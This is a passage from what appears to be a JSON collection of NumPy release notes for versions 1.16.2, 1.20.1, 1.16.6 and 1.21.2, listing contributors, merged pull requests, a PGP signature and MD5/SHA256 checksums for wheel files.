62be044cd58da2a947b7e7b2252a10b42920df9520fc3d39f5c4c70d5460b8ba  numpy-1.16.2-cp27-cp27m-win32.whl\n    adab43bf657488300d3aeeb8030d7f024fcc86e3a9b8848741ea2ea903e56610  numpy-1.16.2-cp27-cp27m-win_amd64.whl\n    9f1d4865436f794accdabadc57a8395bd3faa755449b4f65b88b7df65ae05f89  numpy-1.16.2-cp27-cp27mu-manylinux1_i686.whl\n    fb3c83554f39f48f3fa3123b9c24aecf681b1c289f9334f8215c1d3c8e2f6e5b  numpy-1.16.2-cp27-cp27mu-manylinux1_x86_64.whl\n    6f65e37b5a331df950ef6ff03bd4136b3c0bbcf44d4b8e99135d68a537711b5a  numpy-1.16.2-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d3b3ed87061d2314ff3659bb73896e622252da52558f2380f12c421fbdee3d89  numpy-1.16.2-cp35-cp35m-manylinux1_i686.whl\n    893f4d75255f25a7b8516feb5766c6b63c54780323b9bd4bc51cdd7efc943c73  numpy-1.16.2-cp35-cp35m-manylinux1_x86_64.whl\n    3a0bd1edf64f6a911427b608a894111f9fcdb25284f724016f34a84c9a3a6ea9  numpy-1.16.2-cp35-cp35m-win32.whl\n    2b0b118ff547fecabc247a2668f48f48b3b1f7d63676ebc5be7352a5fd9e85a5  numpy-1.16.2-cp35-cp35m-win_amd64.whl\n    bd2834d496ba9b1bdda3a6cf3de4dc0d4a0e7be306335940402ec95132ad063d  numpy-1.16.2-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    3f25f6c7b0d000017e5ac55977a3999b0b1a74491eacb3c1aa716f0e01f6dcd1  numpy-1.16.2-cp36-cp36m-manylinux1_i686.whl\n    23cc40313036cffd5d1873ef3ce2e949bdee0646c5d6f375bf7ee4f368db2511  numpy-1.16.2-cp36-cp36m-manylinux1_x86_64.whl\n    22752cd809272671b273bb86df0f505f505a12368a3a5fc0aa811c7ece4dfd5c  numpy-1.16.2-cp36-cp36m-win32.whl\n    d20c0360940f30003a23c0adae2fe50a0a04f3e48dc05c298493b51fd6280197  numpy-1.16.2-cp36-cp36m-win_amd64.whl\n    80a41edf64a3626e729a62df7dd278474fc1726836552b67a8c6396fd7e86760  numpy-1.16.2-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    7a78cc4ddb253a55971115f8320a7ce28fd23a065fc33166d601f51760eecfa9  numpy-1.16.2-cp37-cp37m-manylinux1_i686.whl\n    9f4cd7832b35e736b739be03b55875706c8c3e5fe334a06210f1a61e5c2c8ca5  numpy-1.16.2-cp37-cp37m-manylinux1_x86_64.whl\n    dc235bf29a406dfda5790d01b998a1c01d7d37f449128c0b1b7d1c89a84fae8b  numpy-1.16.2-cp37-cp37m-win32.whl\n    4061c79ac2230594a7419151028e808239450e676c39e58302ad296232e3c2e8  numpy-1.16.2-cp37-cp37m-win_amd64.whl\n    8088221e6e27da8d5907729f0bfe798f526836f22cc59ae83a0f867e67416a3e  numpy-1.16.2.tar.gz\n    6c692e3879dde0b67a9dc78f9bfb6f61c666b4562fd8619632d7043fb5b691b0  numpy-1.16.2.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJcdYzbAAoJEGefIoN3xSR7HHQH/2D7Zvd3AV4qj5TPQwjLLyDy\neT89jZeKax4MMWgLxpkLQ0b9o31+EEkbph6Wyi/xsjqE4SwRzc1qVUv1Ki6qKjX8\ntfRk2brxLxQyaW753hWxDaBlcmDdHkubZF/sU9byKvz+b5AFz41lZxdJL7skI4sX\nAsUMfabbn2qQwy30tGK8zJxazWWDuWF9bqGGl5IiyfHZQ5Y3N5t4oDawZ0Bn7GE7\n4BKAIi8GnEWeoSnDOGQa6r3dusS9ykR23ETzbsxarvxgkh4YMaY8/5wb/Ammxo0Q\nOPYBLPkS9u+fPDpC5obVWtLWs2xCvg45t5mY95BMM695O1jmVJVDK9ZD5Jo2oxI=\n=i/Re\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.20.1": "==========================\n\nNumPy 1,20.1 is a rapid bugfix release fixing several bugs and regressions\nreported after the 1.20.0 release.\n\n\nHighlights\n==========\n\n- The distutils bug that caused problems with downstream projects is fixed.\n- The ``random.shuffle`` regression is fixed.\n\n\nContributors\n============\n\nA total of 8 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Nicholas McKibben +\n* Pearu Peterson\n* Ralf Gommers\n* Sebastian Berg\n* Tyler Reddy\n* Aerysv +\n\n\nPull requests merged\n====================\n\nA total of 15 pull requests were merged for this release.\n\n* `18306 <https://github.com/numpy/numpy/pull/18306>`__: MAINT: Add missing placeholder annotations\n* `18310 <https://github.com/numpy/numpy/pull/18310>`__: BUG: Fix typo in ``numpy.__init__.py``\n* `18326 <https://github.com/numpy/numpy/pull/18326>`__: BUG: don't mutate list of fake libraries while iterating over...\n* `18327 <https://github.com/numpy/numpy/pull/18327>`__: MAINT: gracefully shuffle memoryviews\n* `18328 <https://github.com/numpy/numpy/pull/18328>`__: BUG: Use C linkage for random distributions\n* `18336 <https://github.com/numpy/numpy/pull/18336>`__: CI: fix when GitHub Actions builds trigger, and allow ci skips\n* `18337 <https://github.com/numpy/numpy/pull/18337>`__: BUG: Allow unmodified use of isclose, allclose, etc. with timedelta\n* `18345 <https://github.com/numpy/numpy/pull/18345>`__: BUG: Allow pickling all relevant DType types/classes\n* `18351 <https://github.com/numpy/numpy/pull/18351>`__: BUG: Fix missing signed_char dependency. Closes #18335.\n* `18352 <https://github.com/numpy/numpy/pull/18352>`__: DOC: Change license date 2020 -> 2021\n* `18353 <https://github.com/numpy/numpy/pull/18353>`__: CI: CircleCI seems to occasionally time out, increase the limit\n* `18354 <https://github.com/numpy/numpy/pull/18354>`__: BUG: Fix f2py bugs when wrapping F90 subroutines.\n* `18356 <https://github.com/numpy/numpy/pull/18356>`__: MAINT: crackfortran regex simplify\n* `18357 <https://github.com/numpy/numpy/pull/18357>`__: BUG: threads.h existence test requires GLIBC > 2.12.\n* `18359 <https://github.com/numpy/numpy/pull/18359>`__: REL: Prepare for the NumPy 1.20.1 release.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    c4748f4f8f703c5e96027407eca02b08  numpy-1.20.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    f0bf3a78d6b3a169e5a7fb2637f7fd87  numpy-1.20.1-cp37-cp37m-manylinux1_i686.whl\n    493c17647c05ca5043bcbab1ac266a74  numpy-1.20.1-cp37-cp37m-manylinux1_x86_64.whl\n    55ec954fc598c72b2bbf57bfa8b2a701  numpy-1.20.1-cp37-cp37m-manylinux2010_i686.whl\n    8cee88f9683d208686081522609a8726  numpy-1.20.1-cp37-cp37m-manylinux2010_x86_64.whl\n    26399d3ededc53b354de78f977a6197e  numpy-1.20.1-cp37-cp37m-manylinux2014_aarch64.whl\n    81051f1e7a79eea8a5aaf5718114ce3a  numpy-1.20.1-cp37-cp37m-win32.whl\n    899488c55824f02a7a6f0451fc86f63f  numpy-1.20.1-cp37-cp37m-win_amd64.whl\n    17f4dae5a0d143b46345a9cf1a8c8dec  numpy-1.20.1-cp38-cp38-macosx_10_9_x86_64.whl\n    f254e98e92b3054c567b6220b37b81d3  numpy-1.20.1-cp38-cp38-manylinux1_i686.whl\n    483f43a62c7e32ae991990786da90de1  numpy-1.20.1-cp38-cp38-manylinux1_x86_64.whl\n    bf578b783e36d3feb3344973306a9f96  numpy-1.20.1-cp38-cp38-manylinux2010_i686.whl\n    f5d6c77c898537017e64ee30b243fdca  numpy-1.20.1-cp38-cp38-manylinux2010_x86_64.whl\n    5cf541a0d5af3d5812d2970a427075fb  numpy-1.20.1-cp38-cp38-manylinux2014_aarch64.whl\n    178315c579c0a70285b8ee502eb498af  numpy-1.20.1-cp38-cp38-win32.whl\n    5164a32e7a00a2b285302b563eb58afe  numpy-1.20.1-cp38-cp38-win_amd64.whl\n    c123dd10788ea9ff788d735cbee444c5  numpy-1.20.1-cp39-cp39-macosx_10_9_x86_64.whl\n    72282fefe58650c6e7cc41f5b37b8662  numpy-1.20.1-cp39-cp39-manylinux2010_i686.whl\n    234d57c1a7b1f8b99c054a7a71a51cbe  numpy-1.20.1-cp39-cp39-manylinux2010_x86_64.whl\n    352243d4285970e45d825024ca566d47  numpy-1.20.1-cp39-cp39-manylinux2014_aarch64.whl\n    a78c863323e0f56210c2e1acaad1bc22  numpy-1.20.1-cp39-cp39-win32.whl\n    86f9d3f358e7d7896e713bce99f17fdd  numpy-1.20.1-cp39-cp39-win_amd64.whl\n    ed2c81132119fb3c7f73c6a2de306058  numpy-1.20.1-pp37-pypy37_pp73-manylinux2010_x86_64.whl\n    60a5e2517be19394a7df24f6d4add3f2  numpy-1.20.1.tar.gz\n    30ea1c7868e73eeff2c86ac465311220  numpy-1.20.1.zip\n\nSHA256\n------\n::\n\n    ae61f02b84a0211abb56462a3b6cd1e7ec39d466d3160eb4e1da8bf6717cdbeb  numpy-1.20.1-cp37-cp37m-macosx_10_9_x86_64.whl\n    65410c7f4398a0047eea5cca9b74009ea61178efd78d1be9847fac1d6716ec1e  numpy-1.20.1-cp37-cp37m-manylinux1_i686.whl\n    2d7e27442599104ee08f4faed56bb87c55f8b10a5494ac2ead5c98a4b289e61f  numpy-1.20.1-cp37-cp37m-manylinux1_x86_64.whl\n    4ed8e96dc146e12c1c5cdd6fb9fd0757f2ba66048bf94c5126b7efebd12d0090  numpy-1.20.1-cp37-cp37m-manylinux2010_i686.whl\n    ecb5b74c702358cdc21268ff4c37f7466357871f53a30e6f84c686952bef16a9  numpy-1.20.1-cp37-cp37m-manylinux2010_x86_64.whl\n    b9410c0b6fed4a22554f072a86c361e417f0258838957b78bd063bde2c7f841f  numpy-1.20.1-cp37-cp37m-manylinux2014_aarch64.whl\n    3d3087e24e354c18fb35c454026af3ed8997cfd4997765266897c68d724e4845  numpy-1.20.1-cp37-cp37m-win32.whl\n    89f937b13b8dd17b0099c7c2e22066883c86ca1575a975f754babc8fbf8d69a9  numpy-1.20.1-cp37-cp37m-win_amd64.whl\n    a1d7995d1023335e67fb070b2fae6f5968f5be3802b15ad6d79d81ecaa014fe0  numpy-1.20.1-cp38-cp38-macosx_10_9_x86_64.whl\n    60759ab15c94dd0e1ed88241fd4fa3312db4e91d2c8f5a2d4cf3863fad83d65b  numpy-1.20.1-cp38-cp38-manylinux1_i686.whl\n    125a0e10ddd99a874fd357bfa1b636cd58deb78ba4a30b5ddb09f645c3512e04  numpy-1.20.1-cp38-cp38-manylinux1_x86_64.whl\n    c26287dfc888cf1e65181f39ea75e11f42ffc4f4529e5bd19add57ad458996e2  numpy-1.20.1-cp38-cp38-manylinux2010_i686.whl\n    7199109fa46277be503393be9250b983f325880766f847885607d9b13848f257  numpy-1.20.1-cp38-cp38-manylinux2010_x86_64.whl\n    72251e43ac426ff98ea802a931922c79b8d7596480300eb9f1b1e45e0543571e  numpy-1.20.1-cp38-cp38-manylinux2014_aarch64.whl\n    c91ec9569facd4757ade0888371eced2ecf49e7982ce5634cc2cf4e7331a4b14  numpy-1.20.1-cp38-cp38-win32.whl\n    13adf545732bb23a796914fe5f891a12bd74cf3d2986eed7b7eba2941eea1590  numpy-1.20.1-cp38-cp38-win_amd64.whl\n    104f5e90b143dbf298361a99ac1af4cf59131218a045ebf4ee5990b83cff5fab  numpy-1.20.1-cp39-cp39-macosx_10_9_x86_64.whl\n    89e5336f2bec0c726ac7e7cdae181b325a9c0ee24e604704ed830d241c5e47ff  numpy-1.20.1-cp39-cp39-manylinux2010_i686.whl\n    032be656d89bbf786d743fee11d01ef318b0781281241997558fa7950028dd29  numpy-1.20.1-cp39-cp39-manylinux2010_x86_64.whl\n    66b467adfcf628f66ea4ac6430ded0614f5cc06ba530d09571ea404789064adc  numpy-1.20.1-cp39-cp39-manylinux2014_aarch64.whl\n    12e4ba5c6420917571f1a5becc9338abbde71dd811ce40b37ba62dec7b39af6d  numpy-1.20.1-cp39-cp39-win32.whl\n    9c94cab5054bad82a70b2e77741271790304651d584e2cdfe2041488e753863b  numpy-1.20.1-cp39-cp39-win_amd64.whl\n    9eb551d122fadca7774b97db8a112b77231dcccda8e91a5bc99e79890797175e  numpy-1.20.1-pp37-pypy37_pp73-manylinux2010_x86_64.whl\n    9bf51d69ebb4ca9239e55bedc2185fe2c0ec222da0adee7ece4125414676846d  numpy-1.20.1.tar.gz\n    3bc63486a870294683980d76ec1e3efc786295ae00128f9ea38e2c6e74d5a60a  numpy-1.20.1.zip\n\n\n.. currentmodule:: numpy\n\n=========================\n", "1.16.6": "==========================\n\nThe NumPy 1.16.6 release fixes bugs reported against the 1.16.5 release, and\nalso backports several enhancements from master that seem appropriate for a\nrelease series that is the last to support Python 2.7. The wheels on PyPI are\nlinked with OpenBLAS v0.3.7, which should fix errors on Skylake series\ncpus.\n\nDownstream developers building this release should use Cython >= 0.29.2 and, if\nusing OpenBLAS, OpenBLAS >= v0.3.7. The supported Python versions are 2.7 and\n3.5-3.7.\n\nHighlights\n==========\n\n- The ``np.testing.utils`` functions have been updated from 1.19.0-dev0.\n  This improves the function documentation and error messages as well\n  extending the ``assert_array_compare`` function to additional types.\n\n\nNew functions\n=============\n\nAllow matmul (`` operator) to work with object arrays.\n-------------------------------------------------------\nThis is an enhancement that was added in NumPy 1.17 and seems reasonable to\ninclude in the LTS 1.16 release series.\n\n\nCompatibility notes\n===================\n\nFix regression in matmul (`` operator) for boolean types\n---------------------------------------------------------\nBooleans were being treated as integers rather than booleans,\nwhich was a regression from previous behavior.\n\n\nImprovements\n============\n\nArray comparison assertions include maximum differences\n-------------------------------------------------------\nError messages from array comparison tests such as ``testing.assert_allclose``\nnow include \"max absolute difference\" and \"max relative difference,\" in\naddition to the previous \"mismatch\" percentage.  This information makes it\neasier to update absolute and relative error tolerances.\n\nContributors\n============\n\nA total of 10 people contributed to this release.\n\n* CakeWithSteak\n* Charles Harris\n* Chris Burr\n* Eric Wieser\n* Fernando Saravia\n* Lars Grueter\n* Matti Picus\n* Maxwell Aladago\n* Qiming Sun\n* Warren Weckesser\n\nPull requests merged\n====================\n\nA total of 14 pull requests were merged for this release.\n\n* `14211 <https://github.com/numpy/numpy/pull/14211>`__: BUG: Fix uint-overflow if padding with linear_ramp and negative...\n* `14275 <https://github.com/numpy/numpy/pull/14275>`__: BUG: fixing to allow unpickling of PY3 pickles from PY2\n* `14340 <https://github.com/numpy/numpy/pull/14340>`__: BUG: Fix misuse of .names and .fields in various places (backport...\n* `14423 <https://github.com/numpy/numpy/pull/14423>`__: BUG: test, fix regression in converting to ctypes.\n* `14434 <https://github.com/numpy/numpy/pull/14434>`__: BUG: Fixed maximum relative error reporting in assert_allclose\n* `14509 <https://github.com/numpy/numpy/pull/14509>`__: BUG: Fix regression in boolean matmul.\n* `14686 <https://github.com/numpy/numpy/pull/14686>`__: BUG: properly define PyArray_DescrCheck\n* `14853 <https://github.com/numpy/numpy/pull/14853>`__: BLD: add 'apt update' to shippable\n* `14854 <https://github.com/numpy/numpy/pull/14854>`__: BUG: Fix _ctypes class circular reference. (#13808)\n* `14856 <https://github.com/numpy/numpy/pull/14856>`__: BUG: Fix `np.einsum` errors on Power9 Linux and z/Linux\n* `14863 <https://github.com/numpy/numpy/pull/14863>`__: BLD: Prevent -flto from optimising long double representation...\n* `14864 <https://github.com/numpy/numpy/pull/14864>`__: BUG: lib: Fix histogram problem with signed integer arrays.\n* `15172 <https://github.com/numpy/numpy/pull/15172>`__: ENH: Backport improvements to testing functions.\n* `15191 <https://github.com/numpy/numpy/pull/15191>`__: REL: Prepare for 1.16.6 release.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    4e224331023d95e98074d629b79cd4af  numpy-1.16.6-cp27-cp27m-macosx_10_9_x86_64.whl\n    d3a48c10422909a5610b42380ed8ddc6  numpy-1.16.6-cp27-cp27m-manylinux1_i686.whl\n    6896018676021f6cff25abb30d9da143  numpy-1.16.6-cp27-cp27m-manylinux1_x86_64.whl\n    c961575405015b018a497e8f90db5e38  numpy-1.16.6-cp27-cp27m-win32.whl\n    8fa39acea08658ca355005c07e15f06f  numpy-1.16.6-cp27-cp27m-win_amd64.whl\n    8802bee0140fd50aecddab0141d0eb82  numpy-1.16.6-cp27-cp27mu-manylinux1_i686.whl\n    2f9761f243249d33867f86c10c549dfa  numpy-1.16.6-cp27-cp27mu-manylinux1_x86_64.whl\n    171a699d84b6ec8ac699627d606890e0  numpy-1.16.6-cp35-cp35m-macosx_10_9_intel.whl\n    7185860b022aa72cd9abb112b2d2b6cf  numpy-1.16.6-cp35-cp35m-manylinux1_i686.whl\n    33f35e1b39f572ca98e697b7054fffd1  numpy-1.16.6-cp35-cp35m-manylinux1_x86_64.whl\n    2ec010ba75c0ac5602e1dbf7fe01ddbf  numpy-1.16.6-cp35-cp35m-win32.whl\n    88c6c5e1f531e32f65f9f9437045f6f5  numpy-1.16.6-cp35-cp35m-win_amd64.whl\n    751f8ea2353e73bb3440f241ebad6c5d  numpy-1.16.6-cp36-cp36m-macosx_10_9_x86_64.whl\n    819af6ec8c90e8209471ecbc6fc47b95  numpy-1.16.6-cp36-cp36m-manylinux1_i686.whl\n    56ab65e9d3bac5f502507d198634e675  numpy-1.16.6-cp36-cp36m-manylinux1_x86_64.whl\n    88d4ed4565d31a1978f4bf013f4ffd2e  numpy-1.16.6-cp36-cp36m-win32.whl\n    167ac7f60d82bd32feb60e675a2c3b01  numpy-1.16.6-cp36-cp36m-win_amd64.whl\n    2e47bb698842b7289bb34951edf3be3d  numpy-1.16.6-cp37-cp37m-macosx_10_9_x86_64.whl\n    169eb83d7f0a566207048cc282720ff8  numpy-1.16.6-cp37-cp37m-manylinux1_i686.whl\n    454ac4d3e09931bfb58cc01b679f4f5f  numpy-1.16.6-cp37-cp37m-manylinux1_x86_64.whl\n    192593ce2df33b60eab445b31285ad96  numpy-1.16.6-cp37-cp37m-win32.whl\n    de3b92f1133613e1bd96d788ba9d4307  numpy-1.16.6-cp37-cp37m-win_amd64.whl\n    5e958c603605f3168b7b29f421f64cdd  numpy-1.16.6.tar.gz\n    3dc21c84a295fe77eadf8f872685a7de  numpy-1.16.6.zip\n\nSHA256\n------\n::\n\n    08bf4f66f190822f4642e036accde8da810b87fffc0b9409e7a00d9e54760099  numpy-1.16.6-cp27-cp27m-macosx_10_9_x86_64.whl\n    d759ca1b76ac6f6b6159fb74984126035feb1dee9f68b4b961889b6dc090f33a  numpy-1.16.6-cp27-cp27m-manylinux1_i686.whl\n    d3c5377c6122de876e695937ef41ffee5d2831154c5e4856481b93406cdfeecb  numpy-1.16.6-cp27-cp27m-manylinux1_x86_64.whl\n    345b1748e6b0d4773a518868c783b16fdc33a22683bdb863484cd29fe8d206e6  numpy-1.16.6-cp27-cp27m-win32.whl\n    7a5a1f49a643aa1ab3e0579da0a48b8a48ea4369eb63c5065459d0a37f430237  numpy-1.16.6-cp27-cp27m-win_amd64.whl\n    817eed5a6ec2fc9c1a0ee3fbf9a441c66b6766383580513ccbdf3121acc0b4fb  numpy-1.16.6-cp27-cp27mu-manylinux1_i686.whl\n    1680c8d5086a88d293dfd1a10b6429a09140cacee878034fa2308472ec835db4  numpy-1.16.6-cp27-cp27mu-manylinux1_x86_64.whl\n    a4383edb1b8caa989c3541a37ef204916322c503b8eeacc7ee8f4ba24cac97b8  numpy-1.16.6-cp35-cp35m-macosx_10_9_intel.whl\n    9bb690692f3101583b0b99f3be362742e4f8ebe6c7934fa36cd8ca2b567a0bcc  numpy-1.16.6-cp35-cp35m-manylinux1_i686.whl\n    b9e334568ca1bf56598eddfac6db6a75bcf1c91aa90d598648f21e45207daeae  numpy-1.16.6-cp35-cp35m-manylinux1_x86_64.whl\n    55cae40d2024c56e7b79fb070106cb4289dcc6b55c62dba1d89a6944448c6a53  numpy-1.16.6-cp35-cp35m-win32.whl\n    a1ffc9c770ccc2be9284310a3726c918b26ca19b34c0079e7a41aba950ab175f  numpy-1.16.6-cp35-cp35m-win_amd64.whl\n    3f423b06bf67cd1dbf72e13e9b53a9ca71972e5abf712ee6cb5d8cbb178fff02  numpy-1.16.6-cp36-cp36m-macosx_10_9_x86_64.whl\n    34e6bb44e3d9a663f903b8c297ede865b4dff039aa43cc9a0b249e02c27f1396  numpy-1.16.6-cp36-cp36m-manylinux1_i686.whl\n    60c56922c9d759d664078fbef94132377ef1498ab27dd3d0cc7a21b346e68c06  numpy-1.16.6-cp36-cp36m-manylinux1_x86_64.whl\n    23cad5e5858dfb73c0e5bce03fe78e5e5908c22263156c58d4afdbb240683c6c  numpy-1.16.6-cp36-cp36m-win32.whl\n    77399828d96cca386bfba453025c34f22569909d90332b961d3d4341cdb46a84  numpy-1.16.6-cp36-cp36m-win_amd64.whl\n    97ddfa7688295d460ee48a4d76337e9fdd2506d9d1d0eee7f0348b42b430da4c  numpy-1.16.6-cp37-cp37m-macosx_10_9_x86_64.whl\n    390f6e14a8d73591f086680464aa101a9be9187d0c633f48c98b429b31b712c2  numpy-1.16.6-cp37-cp37m-manylinux1_i686.whl\n    a1772dc227e3e415eeaa646d25690dc854bddc3d626e454c7c27acba060cb900  numpy-1.16.6-cp37-cp37m-manylinux1_x86_64.whl\n    c9fb4fcfcdcaccfe2c4e1f9e0133ed59df5df2aa3655f3d391887e892b0a784c  numpy-1.16.6-cp37-cp37m-win32.whl\n    6b1853364775edb85ceb0f7f8214d9e993d4d1d9bd3310eae80529ea14ba2ba6  numpy-1.16.6-cp37-cp37m-win_amd64.whl\n    61562ddac78765969959500b0da9c6f9ba7d77eeb12ec3927afae5303df08777  numpy-1.16.6.tar.gz\n    e5cf3fdf13401885e8eea8170624ec96225e2174eb0c611c6f26dd33b489e3ff  numpy-1.16.6.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.21.2": "==========================\n\nThe NumPy 1.21.2 is maintenance release that fixes bugs discovered after\n1.21.1. It also provides 64 bit manylinux Python 3.10.0rc1 wheels for\ndownstream testing. Note that Python 3.10 is not yet final. There is also\npreliminary support for Windows on ARM64 builds, but there is no OpenBLAS for\nthat platform and no wheels are available.\n\nThe Python versions supported for this release are 3.7-3.9. The 1.21.x series\nis compatible with Python 3.10.0rc1 and Python 3.10 will be officially\nsupported after it is released. The previous problems with gcc-11.1 have been\nfixed by gcc-11.2, check your version if you are using gcc-11.\n\n\nContributors\n============\n\nA total of 10 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Carl Johnsen +\n* Charles Harris\n* Gwyn Ciesla +\n* Matthieu Dartiailh\n* Matti Picus\n* Niyas Sait +\n* Ralf Gommers\n* Sayed Adel\n* Sebastian Berg\n\n\nPull requests merged\n====================\n\nA total of 18 pull requests were merged for this release.\n\n* `19497 <https://github.com/numpy/numpy/pull/19497>`__: MAINT: set Python version for 1.21.x to ``<3.11``\n* `19533 <https://github.com/numpy/numpy/pull/19533>`__: BUG: Fix an issue wherein importing ``numpy.typing`` could raise\n* `19646 <https://github.com/numpy/numpy/pull/19646>`__: MAINT: Update Cython version for Python 3.10.\n* `19648 <https://github.com/numpy/numpy/pull/19648>`__: TST: Bump the python 3.10 test version from beta4 to rc1\n* `19651 <https://github.com/numpy/numpy/pull/19651>`__: TST: avoid distutils.sysconfig in runtests.py\n* `19652 <https://github.com/numpy/numpy/pull/19652>`__: MAINT: add missing dunder method to nditer type hints\n* `19656 <https://github.com/numpy/numpy/pull/19656>`__: BLD, SIMD: Fix testing extra checks when ``-Werror`` isn't applicable...\n* `19657 <https://github.com/numpy/numpy/pull/19657>`__: BUG: Remove logical object ufuncs with bool output\n* `19658 <https://github.com/numpy/numpy/pull/19658>`__: MAINT: Include .coveragerc in source distributions to support...\n* `19659 <https://github.com/numpy/numpy/pull/19659>`__: BUG: Fix bad write in masked iterator output copy paths\n* `19660 <https://github.com/numpy/numpy/pull/19660>`__: ENH: Add support for windows on arm targets\n* `19661 <https://github.com/numpy/numpy/pull/19661>`__: BUG: add base to templated arguments for platlib\n* `19662 <https://github.com/numpy/numpy/pull/19662>`__: BUG,DEP: Non-default UFunc signature/dtype usage should be deprecated\n* `19666 <https://github.com/numpy/numpy/pull/19666>`__: MAINT: Add Python 3.10 to supported versions.\n* `19668 <https://github.com/numpy/numpy/pull/19668>`__: TST,BUG: Sanitize path-separators when running ``runtest.py``\n* `19671 <https://github.com/numpy/numpy/pull/19671>`__: BLD: load extra flags when checking for libflame\n* `19676 <https://github.com/numpy/numpy/pull/19676>`__: BLD: update circleCI docker image\n* `19677 <https://github.com/numpy/numpy/pull/19677>`__: REL: Prepare for 1.21.2 release.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    c4d72c5f8aff59b5e48face558441e9f  numpy-1.21.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    eb09d0bfc0bc39ce3e323182ae779fcb  numpy-1.21.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e0bb19ea8cc13a5152085aa42d850077  numpy-1.21.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    af7d21992179dfa3669a2a238b94a980  numpy-1.21.2-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    9acbaf0074af75d66ca8676b16cec03a  numpy-1.21.2-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    86b755c7ece248e5586a6a58259aa432  numpy-1.21.2-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    b45fbbb0ffabcabcc6dc4cf957713d45  numpy-1.21.2-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    6f23a3050b1482f9708d36928348d75d  numpy-1.21.2-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    ee45e263e6700b745c43511297385fe1  numpy-1.21.2-cp37-cp37m-win32.whl\n    6f587dc9ee9ec8700e77df4f3f987911  numpy-1.21.2-cp37-cp37m-win_amd64.whl\n    e500c1eae3903b7498886721b835d086  numpy-1.21.2-cp38-cp38-macosx_10_9_universal2.whl\n    ddef2b45ff5526e6314205108f2e3524  numpy-1.21.2-cp38-cp38-macosx_10_9_x86_64.whl\n    66b5a212ee2fe747cfc19f13dbfc2d15  numpy-1.21.2-cp38-cp38-macosx_11_0_arm64.whl\n    3ebfe9bcd744c57d3d189394fbbf04de  numpy-1.21.2-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    155a35f990b2e673cb7b361c83fa2313  numpy-1.21.2-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    89e2268d8607b6b363337fafde9fe6c9  numpy-1.21.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e13968b5f61a3b2f33d4053da8ceaaf1  numpy-1.21.2-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    5bede1a84624d538d97513006f97fc06  numpy-1.21.2-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    351b5115ee56f1b598bfa9b479a2492c  numpy-1.21.2-cp38-cp38-win32.whl\n    8a36334d9d183b1ef3e4d3d23b7d0cb8  numpy-1.21.2-cp38-cp38-win_amd64.whl\n    b6aee8cf57f84da10b38566bde93056c  numpy-1.21.2-cp39-cp39-macosx_10_9_universal2.whl\n    20beaff42d793cb148621e0230d1b650  numpy-1.21.2-cp39-cp39-macosx_10_9_x86_64.whl\n    6e348361f3b8b75267dc27f3a6530944  numpy-1.21.2-cp39-cp39-macosx_11_0_arm64.whl\n    809bcd25dc485f31e2c13903d6ac748e  numpy-1.21.2-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    ff4256d8940c6bdce48364af37f99072  numpy-1.21.2-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b8b19e6667e39feef9f7f2e030945199  numpy-1.21.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    eedae53f1929779387476e7842dc5cb3  numpy-1.21.2-cp39-cp39-win32.whl\n    704f66b7ede6778283c33eea7a5b8b95  numpy-1.21.2-cp39-cp39-win_amd64.whl\n    8c5d2a0172f6f6861833a355b1bc57b0  numpy-1.21.2-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    55c11984b0a0ae28baa118052983f355  numpy-1.21.2.tar.gz\n    5638d5dae3ca387be562912312db842e  numpy-1.21.2.zip\n\nSHA256\n------\n::\n\n    52a664323273c08f3b473548bf87c8145b7513afd63e4ebba8496ecd3853df13  numpy-1.21.2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    51a7b9db0a2941434cd930dacaafe0fc9da8f3d6157f9d12f761bbde93f46218  numpy-1.21.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9f2dc79c093f6c5113718d3d90c283f11463d77daa4e83aeeac088ec6a0bda52  numpy-1.21.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    a55e4d81c4260386f71d22294795c87609164e22b28ba0d435850fbdf82fc0c5  numpy-1.21.2-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    426a00b68b0d21f2deb2ace3c6d677e611ad5a612d2c76494e24a562a930c254  numpy-1.21.2-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    298156f4d3d46815eaf0fcf0a03f9625fc7631692bd1ad851517ab93c3168fc6  